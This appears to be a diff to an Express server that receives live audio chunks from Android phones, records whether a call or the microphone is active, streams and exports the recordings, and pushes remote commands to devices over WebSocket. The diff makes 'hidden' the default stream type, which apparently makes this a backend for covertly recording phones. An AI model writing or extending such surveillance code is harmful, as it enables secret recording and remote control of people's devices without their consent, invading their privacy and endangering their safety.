@@ -14,9 +14,11 @@ import rateLimit from 'express-rate-limit';
 import { v4 as uuidv4 } from 'uuid';
 import fs from 'fs';
 import path from 'path';
+import archiver from 'archiver';
 import * as db from '../database';
 import * as storage from '../storage';
 import { appendToHLS, finalizeHLS } from '../hls';
+import { sendDeviceCommand } from '../websocket';
 import { MAX_UPLOAD_SIZE, CHUNK_DURATION_MS, PUBLIC_DIR } from '../config';
 
 const router = Router();
@@ -44,7 +46,8 @@ const upload = multer({
 router.post('/', (req: Request, res: Response) => {
     try {
         const sessionId = req.body?.session_id || uuidv4();
-        const { client_name, device_info, title } = req.body || {};
+        const { client_name, device_info, title, stream_type } = req.body || {};
+        const streamType = stream_type === 'main' ? 'main' : 'hidden';
 
         // Create storage directories
         storage.createSessionDirs(sessionId);
@@ -54,10 +57,11 @@ router.post('/', (req: Request, res: Response) => {
             sessionId,
             client_name || '',
             device_info || '',
-            title || ''
+            title || '',
+            streamType
         );
 
-        console.log(`[broadcast] New session: ${sessionId} (client: ${client_name || 'unknown'})`);
+        console.log(`[broadcast] New session: ${sessionId} (client: ${client_name || 'unknown'}, type: ${streamType})`);
 
         res.status(201).json({
             status: 'created',
@@ -91,13 +95,15 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
             const clientName = (req.body && req.body.client_name) 
                 || (db.getAllDeviceCommands()[0]?.client_id) 
                 || 'Realme-RMX2040';
+            const streamType = req.body?.stream_type === 'main' ? 'main' : 'hidden';
             session = db.createSession(
                 session_id,
                 clientName,
                 'Android Device (Live)',
-                `Live Stream - ${clientName}`
+                streamType === 'main' ? `Main Recording - ${clientName}` : `Live Stream - ${clientName}`,
+                streamType
             );
-            console.log(`[broadcast] Auto-recovered live session for chunk: ${session_id} (${clientName})`);
+            console.log(`[broadcast] Auto-recovered live session for chunk: ${session_id} (${clientName}, type: ${streamType})`);
         } else if (session.status !== 'live') {
             db.reactivateSession(session_id);
             console.log(`[broadcast] Reactivated ended session to live on chunk ingest: ${session_id}`);
@@ -169,7 +175,7 @@ router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, r
         console.log(`[broadcast] Chunk saved: session=${session_id} seq=${sequenceNum} call=${inCall} micUse=${micInUse}`);
 
         // Generate HLS segment (async — don't block response)
-        appendToHLS(session_id, saved.filepath, sequenceNum, clientTimestamp).catch(err => {
+        appendToHLS(session_id, saved.filepath, sequenceNum, clientTimestamp, durationMs).catch(err => {
             console.error(`[broadcast] HLS generation failed for seq ${sequenceNum}:`, err);
         });
 
@@ -237,40 +243,24 @@ router.get('/:session_id/export-channel', exportRateLimit, (req: Request, res: R
             res.setHeader('Content-Type', 'application/zip');
             res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
 
-            const { spawn } = require('child_process');
-            const proc = spawn('zip', ['-q', '-j', '-', '-@'], {
-                stdio: ['pipe', 'pipe', 'pipe'],
+            const archive = archiver('zip', {
+                zlib: { level: 6 },
             });
 
-            proc.stdout.pipe(res);
-            proc.stderr.on('data', (data: Buffer) => {
-                console.error(`[broadcast] ZIP export stderr: ${data.toString()}`);
-            });
-            proc.on('error', (err: any) => {
+            archive.on('error', (err: any) => {
                 console.error('[broadcast] ZIP export error:', err);
                 if (!res.headersSent) {
                     res.status(500).json({ status: 'error', message: 'ZIP export failed' });
                 }
             });
-            proc.on('close', (code: number) => {
-                if (code !== 0) {
-                    console.error(`[broadcast] ZIP export exited with code ${code}`);
-                    if (!res.writableEnded) {
-                        res.end();
-                    }
-                }
-            });
+
+            archive.pipe(res);
 
             for (const filePath of chunkFiles) {
-                proc.stdin.write(`${filePath}\n`);
+                archive.file(filePath, { name: path.basename(filePath) });
             }
-            proc.stdin.end();
 
-            req.on('close', () => {
-                if (!proc.killed) {
-                    proc.kill();
-                }
-            });
+            archive.finalize();
             return;
         }
         
@@ -386,8 +376,16 @@ router.post('/remote-command', (req: Request, res: Response) => {
 
         db.setDeviceCommand(client_id, command);
         console.log(`[broadcast] Remote command set for ${client_id}: ${command}`);
+
+        // ⚡ Send instant push command through live WebSocket (0ms latency, WhatsApp style)
+        const pushedViaSocket = sendDeviceCommand(client_id, command);
         
-        res.json({ status: 'success', client_id, command });
+        res.json({
+            status: 'success',
+            client_id,
+            command,
+            delivered_via_socket: pushedViaSocket,
+        });
     } catch (err: any) {
         res.status(500).json({ status: 'error', message: err.message });
     }
